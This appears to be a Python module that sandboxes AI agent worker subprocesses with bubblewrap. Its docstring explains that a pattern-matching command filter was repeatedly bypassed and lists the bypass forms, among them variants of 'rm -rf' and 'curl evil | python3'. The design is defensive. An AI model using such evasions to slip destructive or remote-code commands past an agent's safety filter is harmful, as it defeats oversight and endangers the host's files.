"""OS-level sandbox for worker subprocesses (FS7 round-3 — primary safety layer).

The legacy ``_scan_bash`` pattern-matcher in ``agent/safety/hooks.py`` is
fundamentally exhaustible: three rounds of fix-loops produced 5+5+5 new P0
bypasses each (``bash <<<``, ``(rm -rf x)``, ``{rm,-rf,x}``, ``xargs rm -rf``,
``curl evil | python3`` …). The blacklist approach loses the arms race.

This module replaces "primary safety = pattern match" with "primary safety =
OS-level isolation". A worker is run inside a `bwrap`(1) namespace + mount
sandbox so the bash inside it physically cannot reach the orchestrator's prod
files, regardless of how cleverly the shell is invoked. ``_scan_bash`` stays
as defence-in-depth (catches the known cases, logs suspicious) but is no
longer the safety floor.

Sandbox backends are pluggable via the :class:`Sandbox` Protocol. The default
factory :func:`detect_sandbox` picks ``bwrap`` if available, else
:class:`NoSandbox` with a loud audit-log warning.

Override via ``BMAD_SANDBOX=bwrap|none`` env (test fixtures, force-disable
scenarios).
"""

from __future__ import annotations

import logging
import os
import shutil
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Protocol, runtime_checkable

log = logging.getLogger(__name__)

NetworkPolicy = Literal["none", "github_only", "full"]

# Env var allow-list propagated into the sandbox. Mirrors
# ``runtime.worker_spawn.ALLOWED_WORKER_ENV`` plus per-call ORCHESTRATOR_*
# context the caller passes in ``env``. Keeping a separate constant here lets
# the sandbox stay decoupled from worker_spawn import (which itself imports
# from agent.tools, a circular risk).
_SANDBOX_DEFAULT_ENV_ALLOWLIST: frozenset[str] = frozenset({
    "PATH", "HOME", "USER", "LANG", "LC_ALL", "TZ", "PWD", "SHELL", "TERM",
})


@runtime_checkable
class Sandbox(Protocol):
    """Pluggable OS-level isolation backend.

    Implementations wrap a command list with backend-specific isolation
    directives. The returned list is what the caller actually passes to
    ``asyncio.create_subprocess_exec`` / ``subprocess.Popen``.
    """

    @property
    def kind(self) -> str: ...

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        """Return ``cmd`` wrapped with backend isolation flags.

        Args:
            cmd: argv of the inner process (``["claude", "-p", ...]``).
            worktree: writable mount root. Anything outside is read-only or
                hidden depending on backend.
            readonly_paths: extra paths to expose read-only (e.g. shared
                source for retros). Validated as absolute.
            network: ``"none"`` isolates the netns (default — safest);
                ``"full"`` shares host net; ``"github_only"`` is currently
                treated as ``"full"`` (nftables whitelist deferred per spec
                §5 "Out of scope").
            env: env vars to inject. Caller is responsible for already
                running them through their allow-list; sandbox only
                forwards.

        Returns:
            New argv list. ``NoSandbox`` returns ``cmd`` unchanged.
        """
        ...


@dataclass(frozen=True, slots=True)
class BwrapSandbox:
    """``bwrap``-backed sandbox (Bubblewrap, Flatpak's isolation primitive).

    Default policy:
      * ``--ro-bind / /`` — entire FS read-only.
      * ``--bind {worktree} {worktree}`` — worker can only write here.
      * ``--proc /proc``, ``--dev /dev`` — minimal proc/dev namespace.
      * ``--tmpfs /tmp`` — fresh empty tmpfs per invocation.
      * ``--unshare-pid/uts/ipc/cgroup`` — namespace isolation.
      * ``--unshare-net`` iff ``network == "none"`` (default).
      * ``--die-with-parent`` — auto-cleanup if orchestrator dies.
      * ``--new-session`` — detach from controlling TTY.
      * ``--setenv K V`` per allow-listed env var; everything else stripped.

    Read-only paths supplied via ``readonly_paths`` are additionally
    ``--ro-bind``ed. Useful for retros that read shared planning artifacts
    without granting write.
    """

    bwrap_path: str = "/usr/bin/bwrap"
    kind: str = "bwrap"

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        wt_abs = Path(worktree).resolve(strict=False)
        if not wt_abs.is_absolute():
            raise ValueError(f"worktree must be absolute: {worktree!r}")

        wrapped: list[str] = [
            self.bwrap_path,
            "--die-with-parent",
            "--new-session",
            "--ro-bind", "/", "/",
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",  # noqa: S108 — bwrap mount point inside the sandbox namespace, not a host path
            "--bind", str(wt_abs), str(wt_abs),
            "--chdir", str(wt_abs),
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--unshare-cgroup-try",
        ]

        if network == "none":
            wrapped += ["--unshare-net"]
        # network="full" or "github_only" → share host netns (nftables
        # whitelist for github_only is deferred per spec §5).

        if readonly_paths:
            for p in readonly_paths:
                p_abs = Path(p).resolve(strict=False)
                if not p_abs.is_absolute():
                    raise ValueError(f"readonly_path must be absolute: {p!r}")
                wrapped += ["--ro-bind", str(p_abs), str(p_abs)]

        # Env propagation: clear ALL inherited env first, then forward only
        # the default allow-list + caller-provided ``env``. Without
        # ``--clearenv`` bwrap inherits the parent's env (incl.
        # ANTHROPIC_API_KEY etc), defeating the env-allowlist contract.
        wrapped += ["--clearenv"]
        merged_env: dict[str, str] = {
            k: os.environ[k]
            for k in _SANDBOX_DEFAULT_ENV_ALLOWLIST
            if k in os.environ
        }
        if env:
            merged_env.update(env)
        for k, v in merged_env.items():
            wrapped += ["--setenv", k, v]

        wrapped += ["--"]
        wrapped += list(cmd)
        return wrapped


@dataclass(frozen=True, slots=True)
class NoSandbox:
    """Fallback when no OS-level sandbox is available.

    ``wrap_command`` returns the command verbatim. On construction the
    factory logs a warning + emits an ``audit`` event so any prod
    deployment without ``bwrap`` is conspicuously flagged.
    """

    kind: str = "none"

    def wrap_command(
        self,
        cmd: list[str],
        *,
        worktree: Path,
        readonly_paths: list[Path] | None = None,
        network: NetworkPolicy = "none",
        env: dict[str, str] | None = None,
    ) -> list[str]:
        if not cmd:
            raise ValueError("cmd must be non-empty")
        return list(cmd)


def _emit_no_sandbox_audit(reason: str) -> None:
    """Best-effort audit event when falling back to NoSandbox. Failures here
    must not block worker spawn — audit is observability, not gating."""
    try:
        from bmad_orchestrator.agent.safety.audit import record_audit
        record_audit(
            "sandbox_unavailable",
            sandbox_kind="none",
            reason=reason,
            severity="warning",
        )
    except Exception as exc:
        log.warning("audit emit failed for sandbox fallback: %s", exc)


def detect_sandbox() -> Sandbox:
    """Pick the best sandbox backend available.

    Order:
      1. ``BMAD_SANDBOX`` env override (``bwrap`` | ``none``).
      2. ``shutil.which("bwrap")`` → :class:`BwrapSandbox`.
      3. fallback → :class:`NoSandbox` (loud audit warning).
    """
    override = os.environ.get("BMAD_SANDBOX", "").strip().lower()
    if override == "none":
        log.warning("BMAD_SANDBOX=none — worker isolation DISABLED")
        _emit_no_sandbox_audit("env_override")
        return NoSandbox()
    if override == "bwrap":
        path = shutil.which("bwrap")
        if not path:
            log.error("BMAD_SANDBOX=bwrap but bwrap not found in PATH")
            _emit_no_sandbox_audit("bwrap_override_missing_binary")
            return NoSandbox()
        return BwrapSandbox(bwrap_path=path)

    path = shutil.which("bwrap")
    if path:
        return BwrapSandbox(bwrap_path=path)

    log.error(
        "bwrap not found on PATH — falling back to NoSandbox. "
        "Worker subprocess isolation DISABLED. Install `bubblewrap` "
        "(apt install bubblewrap) to restore primary safety layer."
    )
    _emit_no_sandbox_audit("bwrap_not_installed")
    return NoSandbox()


__all__ = [
    "BwrapSandbox",
    "NetworkPolicy",
    "NoSandbox",
    "Sandbox",
    "detect_sandbox",
]
